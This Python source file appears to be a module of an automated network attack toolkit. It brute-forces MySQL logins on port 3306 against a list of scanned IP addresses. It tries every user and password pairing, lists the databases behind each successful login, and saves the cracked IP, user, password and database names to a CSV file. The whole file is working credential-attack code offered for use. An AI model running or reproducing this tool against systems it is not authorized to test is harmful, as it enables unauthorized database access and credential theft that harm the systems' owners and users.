import os
import csv
import pymysql
import threading
import logging
import time
from queue import Queue
from shared import SharedData
from logger import Logger
from actions.base_connector import BaseConnector, BaseBruteforce

logger = Logger(name="sql_bruteforce.py", level=logging.DEBUG)

b_class = "SQLBruteforce"
b_module = "sql_connector"
b_status = "brute_force_sql"
b_port = 3306
b_parent = None

class SQLBruteforce(BaseBruteforce):
    def __init__(self, shared_data):
        super().__init__(shared_data, SQLConnector(shared_data))

    def execute(self, ip, port, row, status_key):
        success, results = self.run(ip, port)
        return 'success' if success else 'failed'

class SQLConnector(BaseConnector):
    PORT = 3306
    SERVICE_NAME = "SQL"
    CSV_HEADER = ['IP Address', 'User', 'Password', 'Port', 'Database']

    @property
    def output_file(self):
        return self.shared_data.sqlfile

    def _init_output_file(self):
        if not os.path.exists(self.output_file):
            with open(self.output_file, "w", newline='') as f:
                writer = csv.writer(f)
                writer.writerow(self.CSV_HEADER)

    def _get_queue_items(self, ip, port, mac, hostname):
        for user in self.users:
            for password in self.passwords:
                yield (ip, user, password, mac, hostname, port)

    def connect(self, ip, user, password):
        try:
            conn = pymysql.connect(host=ip, user=user, password=password, port=3306)
            with conn.cursor() as cursor:
                cursor.execute("SHOW DATABASES")
                databases = [db[0] for db in cursor.fetchall()]
            conn.close()
            logger.info(f"Successfully connected to {ip} with user {user}")
            logger.info(f"Available databases: {', '.join(databases)}")
            self._last_databases = databases
            return True
        except pymysql.Error as e:
            logger.error(f"Failed to connect to {ip} with user {user}: {e}")
            self._last_databases = []
            return False

    def _process_queue_item(self, item, success_flag):
        ip, user, password, mac, hostname, port = item
        success = self.connect(ip, user, password)
        if success:
            databases = getattr(self, '_last_databases', [])
            with self.lock:
                for db in databases:
                    self.results.append([ip, user, password, port, db])
                logger.success(f"Found credentials for IP: {ip} | User: {user} | Password: {password}")
                logger.success(f"Databases found: {', '.join(databases)}")
                self.save_results()
                self.removeduplicates()
                success_flag[0] = True

    def save_results(self):
        file_exists = os.path.exists(self.output_file)
        with open(self.output_file, 'a', newline='') as f:
            writer = csv.writer(f)
            if not file_exists:
                writer.writerow(self.CSV_HEADER)
            writer.writerows(self.results)
        logger.info(f"Saved results to {self.output_file}")
        self.results = []

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        sql_bruteforce = SQLBruteforce(shared_data)
        logger.info("[bold green]Starting SQL brute force attack on port 3306[/bold green]")
        ips_to_scan = shared_data.read_data()
        for row in ips_to_scan:
            ip = row["IPs"]
            sql_bruteforce.execute(ip, b_port, row, b_status)
        logger.info(f"Total successful attempts: {len(sql_bruteforce.connector.results)}")
        exit(len(sql_bruteforce.connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
